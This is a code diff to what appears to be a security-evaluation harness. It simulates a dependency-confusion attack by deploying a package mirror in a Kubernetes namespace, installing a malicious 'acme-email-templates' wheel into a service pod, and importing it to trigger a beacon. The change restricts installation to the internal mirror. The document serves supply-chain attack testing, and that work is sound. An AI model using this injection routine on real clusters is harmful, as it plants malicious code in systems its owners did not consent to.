@@ -188,17 +188,6 @@ _SETUP_PY = textwrap.dedent("""\
 """)
 
 # ---------------------------------------------------------------------------
-# pip.conf written into the pod
-# ---------------------------------------------------------------------------
-
-_PIP_CONF_TEMPLATE = textwrap.dedent("""\
-    [global]
-    index-url = http://{mirror_host}:{mirror_port}/simple/
-    trusted-host = {mirror_host}
-    extra-index-url = https://pypi.org/simple/
-""")
-
-# ---------------------------------------------------------------------------
 # Attack manifest
 # ---------------------------------------------------------------------------
 
@@ -206,7 +195,7 @@ DEP_CONFUSION_MANIFEST = AttackManifest(
     attack_id="dep-confusion-001",
     attack_family="dependency_confusion",
     target_service="emailservice",
-    target_image="gcr.io/google-samples/microservices-demo/emailservice:latest",
+    target_image="tiangolo/uwsgi-nginx-flask:python3.11",
     target_component_purl=f"pkg:pypi/acme-email-templates@{_MALICIOUS_PKG_VERSION}",
     clean_component_purl=f"pkg:pypi/acme-email-templates@{_CLEAN_PKG_VERSION}",
     injection_time_offset_s=0.0,
@@ -219,7 +208,7 @@ DEP_CONFUSION_MANIFEST = AttackManifest(
     control_endpoint=f"{_SINK_HOST}:{_SINK_PORT}",
     recovery_steps=[
         f"pip uninstall -y {_PKG_NAME} (inside pod)",
-        "rm -f /tmp/pip.conf /tmp/.acme_beacon.py (inside pod)",
+        "rm -f /tmp/.acme_beacon.py (inside pod)",
         "pkill -f .acme_beacon.py (inside pod, best-effort)",
         "kubectl delete deployment/pypiserver-mirror svc/pypiserver-mirror (in eval ns)",
     ],
@@ -410,15 +399,26 @@ class DependencyConfusionAttack(BaseAttack):
         )
         return result.stdout.strip()
 
+    @staticmethod
+    def _local_index_install_command(mirror_host_port: str) -> list[str]:
+        """Install from the isolated lab mirror without a public fallback."""
+        mirror_host, mirror_port = mirror_host_port.rsplit(":", 1)
+        return [
+            "pip", "install", "--quiet", "--no-cache-dir", "--no-deps",
+            "--force-reinstall", "--index-url",
+            f"http://{mirror_host}:{mirror_port}/simple/", "--trusted-host",
+            mirror_host, f"{_PKG_NAME}=={_MALICIOUS_PKG_VERSION}",
+        ]
+
     def inject(self, target_namespace: str, pod_name: str) -> bool:
-        """Deploy mirror, upload package, configure pip.conf, install package.
+        """Deploy an internal mirror, upload the package, and install from it.
 
         Steps:
           1. Run SafetyPreflight validation.
           2. Build the malicious wheel locally.
           3. Deploy pypiserver mirror into eval namespace.
           4. Upload wheel to mirror.
-          5. Write /tmp/pip.conf into emailservice pod and install package.
+          5. Install from the internal mirror only; no public package index is configured.
           6. python -c "import acme_email_templates" to trigger beacon.
 
         Args:
@@ -462,28 +462,13 @@ class DependencyConfusionAttack(BaseAttack):
             self._upload_package_to_mirror(wheel_path, mirror_pod)
         except Exception as exc:
             log.warning("dep_confusion.mirror_setup_failed", extra={"error": str(exc)[:200]})
+            return False
 
-        # 3. Copy wheel into the target pod and pip install it.
-        remote_wheel = f"/tmp/{wheel_path.name}"
-        self._kubectl_cp(
-            namespace=target_namespace,
-            pod_name=pod_name,
-            local_path=str(wheel_path),
-            remote_path=remote_wheel,
-            timeout=60,
-        )
-        log.info("dep_confusion.inject.wheel_copied")
-
-        # 4. pip install the malicious wheel.
+        # 3. Resolve the version through the internal package registry only.
         self._kubectl_exec(
             namespace=target_namespace,
             pod_name=pod_name,
-            command=[
-                "pip", "install",
-                "--quiet",
-                "--force-reinstall",
-                remote_wheel,
-            ],
+            command=self._local_index_install_command(mirror_host_port),
             timeout=120,
         )
         log.info("dep_confusion.inject.pip_installed")
@@ -536,7 +521,7 @@ class DependencyConfusionAttack(BaseAttack):
             return False
 
     def recover(self, target_namespace: str, pod_name: str) -> bool:
-        """Uninstall the confusion package and remove pip.conf.
+        """Uninstall the confusion package and remove its local beacon.
 
         Steps:
           1. Run SafetyPreflight validation.
@@ -576,12 +561,12 @@ class DependencyConfusionAttack(BaseAttack):
         except subprocess.CalledProcessError as exc:
             log.warning("dep_confusion.recover.uninstall_failed", extra={"error": str(exc)})
 
-        # 2. Remove pip.conf and beacon script.
+        # 2. Remove the beacon script.
         try:
             self._kubectl_exec(
                 namespace=target_namespace,
                 pod_name=pod_name,
-                command=["rm", "-f", "/tmp/pip.conf", "/tmp/.acme_beacon.py"],
+                command=["rm", "-f", "/tmp/.acme_beacon.py"],
                 timeout=10,
             )
         except subprocess.CalledProcessError as exc:
